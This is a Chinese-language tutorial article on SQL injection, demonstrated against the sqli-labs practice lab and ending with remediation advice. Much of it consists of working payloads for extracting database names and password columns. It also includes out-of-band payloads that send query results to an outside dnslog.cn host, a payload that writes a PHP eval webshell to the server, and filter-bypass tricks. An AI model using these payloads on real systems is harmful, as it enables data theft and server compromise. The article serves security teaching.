#  一文读懂SQL注入漏洞   
simple学安全  simple学安全   2024-11-19 07:16  
  
目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibbU68UK4TicZDTGk0jAU1VWH63xeJQ5utibeyFS8jky7m5L9mLs6vDCKEFSo9SO3DhRvHWqngiblic6A/640?wx_fmt=png&from=appmsg "")  
  
  
简介  
  
SQL注入指的是web应用程序对用户输入数据的合法性未进行判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询；关键点在于**参数用户可控**以及**参数带入数据库查询**。  
  
SQL注入类型  
  
1、**联合查询注入**  
  
关键字：**union select**  
  
联合注入会将结果显示在前端页面。  
  
正常访问：http://192.168.1.128/sqli-labs-master/Less-1/?id=1  
  
1）测试发现   
```
id=1' and '1'='1
id=1' and '1'='2
```  
  
返回不同，说明存在SQL注入漏洞，且为字符型。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RfZ8icA2zvfXwy7Y8LwAQ9sibue897EVCNJvLkN5Z4R8cibiaP8QRZiaeyKg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RBEy410KORZ75jbToB0s1dWbzgTtiaibVZrw7Mn5FCdchPBrkF2zjYcMQ/640?wx_fmt=png&from=appmsg "")  
  
2）利用 **order by num** 确定字段数，当num为3时返回数据，num为4时不返回数据，由此确定字段数为3.  
```
?id=1' order by 3--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RGrHJqojf98CHOGM8sBzELkqcM2F7hTnIGuSP1c2mP5wgOThybvtibeg/640?wx_fmt=png&from=appmsg "")  
  
  
3）利用联合查询获得数据  
```
获得网站使用的数据库，这里查询到数据库为security：
?id=-1' union select 1,database(),3--+

获得数据库版本：
?id=-1' union select 1,version(),3--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4Rrf3JrDFIpdRrFIjALStdia9j2Ts9JECDUFIXM3WtO0kqZzbFzR2iaiaPA/640?wx_fmt=png&from=appmsg "")  
```
查询指定数据库下的表名，查询到有users表：
?id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security' limit 0,1),3--+

查询指定表下的列名，查询到users表中有password列：
?id=-1' union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),3--+

查询具体数据，这里是查询users表中password列的内容：
?id=-1' union select 1,(select password from security.users limit 2,1),3--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RvgAobKzOAQfAjRrwFeR7VBq1AZpTmFBJ1UTOw1qWfKYkUbqNXmzxxg/640?wx_fmt=png&from=appmsg "")  
  
2、**布尔注入**  
  
关键函数：**length()**、**substr()**  
  
布尔注入不会将结果回显，需要根据页面不同进行判断  
  
1）测试发现  
```
?id=1' and '1'='1
?id=1' and '1'='2
```  
  
  
响应不同  
，说明存在SQL注入漏洞，且为字符型。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4R694JeMchrUNn5bicwWcMAVib2icHzw5buBBxgaVMPe8WLHcfGqtbEJovg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RmncibaeiaeFxvWZ8XcAOaX3N8jHvoILYWuQfBF62pNBEUiaYRNzycb5nA/640?wx_fmt=png&from=appmsg "")  
  
2）利用length函数判断数据库的长度，当=8时，返回为真  
```
?id=1' and length(database())=8--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RbhEFtQ8KKAH8eicBuNIDhKQrMmnUCmGtXCbnz6icNLOoo2cZ5jMrnS3Q/640?wx_fmt=png&from=appmsg "")  
  
3）利用substr函数比较得出数据库名的第一个字符为‘s’，依次可以得到全部8个字符：security  
```
?id=1' and substr(database(),1,1)='s'--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RqY6ZQY0FJZ1ouHEFyTjOaX0cMoNJzTPjnx8S4aVDXJK7kDIzkG5JQw/640?wx_fmt=png&from=appmsg "")  
  
3、**报错注入**  
  
报错注入的情况可在页面上看到报错信息输出  
  
关键函数：  
updatexml()  
、  
floor()  
、  
extractvalue()  
  
1）测试发现  
```
?id=1"
```  
  
会将报错信息返回  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RcdGmOWaevvzU5EK0UA0j0eJlQcVly1uT3UOb5vrZmBJ2lxmW7VDJibQ/640?wx_fmt=png&from=appmsg "")  
  
2）利用updatexml函数获得数据库名  
```
?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RE1ia6Amyjq2WYXVu730YXhqJGAPbqA6a1ORpHc3KKzzCXEdkvYIZUgQ/640?wx_fmt=png&from=appmsg "")  
  
3）依次可获得表名、列名，具体数据  
```
?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+

?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),0x7e),1)--+

?id=1" and updatexml(1,concat(0x7e,(select password from security.users limit 2,1),0x7e),1)--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RePy5hMPZjsc4W0ibssjDq5ubpufSOlqCKHdJ62MFib0Ag3uro69nRWIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4Rb52icasAqCwTBCAX1icrIQ9sTFMWrFCmfZBPzODqwia6wb03YD47hArZg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RNxqIDeQmemKL3OsEdndDgb8xibCQzQYG93VMoKsOFiaUIkhkBKMOiaPZA/640?wx_fmt=png&from=appmsg "")  
  
4、**延时注入**  
  
延时注入与布尔注入一样，页面无回显，根据页面响应时间来判断  
  
关键函数：  
sleep()  
、  
benchmark()  
、if(expr1,expr2,expr3) 当expr1为true时执行expr2，否则执行expr3  
  
1）使用sleep函数使执行时间变长，根据响应时间判断是否存在  
```
?id=1' and sleep(5)--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RvtaReXj2iatuSarSDECllsjPTmsS0JyoHFtLLIDrtH026lorgm4EyMw/640?wx_fmt=png&from=appmsg "")  
  
2）结合if函数，通过响应时间即可进行漏洞利用  
```
判断数据库名长度：
?id=1' and if(length(database())=8,sleep(5),1)--+

判断数据库名第一个字符：
?id=1' and if(substr(database(),1,1)='s',sleep(5),0)--+
```  
  
依次可获得完整的数据库名、表名、列名以及具体数据。  
  
5、**堆叠查询注入**  
  
堆叠查询可以执行多条SQL语句，多语句之间用分号隔开。  
通常堆叠查询只有前面语句的结果返回，而后续构造的语句结果无法返回，需要结合sleep()函数，与延时注入步骤一致  
  
关键点：数据库执行语句的特性，用分号;分隔可执行多条语句。  
  
1）测试语句  
```
判断数据库名长度：
?id=1';select if(length(database())=8,sleep(5),1)--+

判断数据库名第一个字符
?id=1';select if(substr(database(),1,1)='s',sleep(5),1)--+

判断表名第一个字符
?id=1';select if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='u',sleep(5),1)--+
```  
  
6、**二次注入**  
  
二次注入是指已经存储的用户输入，被读取后再次进入到SQL查询语句中导致的注入。形成的原理大概是对于输入的数据进行了编码或者转义，在之后的代码中无法起作用，但是存储到数据库中又对数据进行了解码，存储了原本的格式，这导致后续取该数据使用时，拼接到SQL语句中，造成SQL注入。  
  
关键点：存入数据库的恶意数据并未被转义，取出时也未处理，直接拼接到SQL语句中执行。  
  
1）比如说用户注册时，用户名设置为 test' 在后续代码中被转义为 test\' 但是存储到数据库中为 test'，注册后返回用户ID：9  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RA4xe1AHHJRYLoKdFcVYBUVicMPISXwbNb2lI21rNkTYRBEcfVS2sUtA/640?wx_fmt=png&from=appmsg "")  
  
2）接下来可以通过用户id：9来查询对应用户的信息，此时会从数据库中取出用户名，并拼接到SQL语句进行执行，由于对从数据库中取出的数据未做处理，直接就是以 test' 进行拼接，导致SQL注入漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4RGxtTCOsMTN35efNpCic6ibuWSHTzczVqymGOFwH3v70pZka9hXycjGvw/640?wx_fmt=png&from=appmsg "")  
  
所以后续的利用只需在注册时写入恶意语句，然后访问对应id触发。  
  
7、**宽字节注入**  
  
宽字节注入的原理是使转义符\失效，条件是数据库  
编码使用GBK  
，GBK编码占2个字节，多于1个字节，因此称为宽字节。比如说输入id=1%27会被转义：id=1%5c%27，其中%5c是转义符\的编码；  
  
这时我们输入id=1%df%27就会被转义：id=1  
%df%5c  
%27，如果在GBK编码下，  
%df  
%  
5c这两个字节就是一个GBK码，即繁体字：  
  
“連”；这样一来转义符就没了，单引号就有效了，自然就造成了SQL注入。  
  
关键点：  
%df%5c  
在GBK编码下是一个繁体字  
  
1）只需在会被转义的符号比如 ' " 前加上%df即可实现宽字节注入  
```
?id=1%df'

?id=1%df' order by 3--+

?id=-1%df' union select 1,(select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 1,1) limit 0,1),3,4,5,6--+
```  
  
8、**带外注入**  
  
对于布尔注入和延时注入，耗时巨大，在能使用load_file()函数的情况下，可以使用该函数读取远程文件，可以请求外部则可能存在带外注入。  
  
load_file()函数的参数为地址，遵循  
UNC命名，由三个部分组成- 服务器名, 共享名, 和一个可选的文件路径：\\xxxx\xx\x；  
  
关键函数：  
load_file()、concat()  
```
获得数据库名：
?id=-1' union select 1,load_file(concat('\\\\',(select database()),'.1rnpwi.dnslog.cn\\xxx'))--+

获得表名：
?id=-1' union select 1,load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema="security" limit 0,1),'.1rnpwi.dnslog.cn\\xxx'))--+
```  
  
9、**getshell**  
  
使用into outfile将webshell写入服务器，前提是拥有web目录的写权限、知道网站的绝对路径、secure_file_priv没有值。  
  
1）假设从phpinfo文件中获得了网站的绝对路径：  
  
D:/phpStudy/PHPTutorial/WWW/，现利用SQL注入漏洞写入webshell  
```
?id=-1' union select 1,"<?php @eval($_POST['cmd']);?>",3 into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\shell.php"--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibntmCYZHBc7zibIaCPGlz4R0XWFzx60icMQ0W4O03cuIpnAibtib6xibm8HDcfmnbrNlzy7ocelPqiafdg/640?wx_fmt=png&from=appmsg "")  
  
SQL注入绕过  
  
1、**大小写绕过**  
  
改变关键字的大小写尝试绕过，例如and->And、order by->Order By等  
  
2、**双写绕过**  
  
双写绕过的应用场景：关键字被去除，比如输入and 1=1，被过滤去除后变为1=1，则可以尝试双写绕过，例如anandd、selselectect  
  
3、**编码绕过**  
  
对关键字进行两次URL编码，例如将and、select等关键字进行两次url编码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibbU68UK4TicZDTGk0jAU1VW7XhiblE0C9KQFQQWtET3MzIqJdpEq1WbibCeUMviasUQOkqOGiaJjnT8WQ/640?wx_fmt=png&from=appmsg "")  
  
4、**内联注释绕过**  
  
内联注释形式：/*! code */ 可用于整个sql语句中，用来执行sql语句，可用内联注释将关键字包起来，尝试绕过。例如：  
```
?id=1/*!and*/1=1--+
?id=1/*!union*//*!select*/1,2,3--+
```  
  
修复建议  
  
1、使用预编译语句：使用PDO预编译语句，使用占位符进行数据库的增删改查，不会将输入的数据直接作为SQL语句的一部分执行。  
  
2、过滤关键字：过滤SQL注入常见的关键字，例如select、sleep、union等。  
  
3、严格的数据类型：使用函数对输入的数据类型做判断，防范数字型注入。  
  
4、对特殊字符进行转义或者编码。  
  
END  
  
**查看更多精彩内容，关注**  
**simple学安全**  
  
  
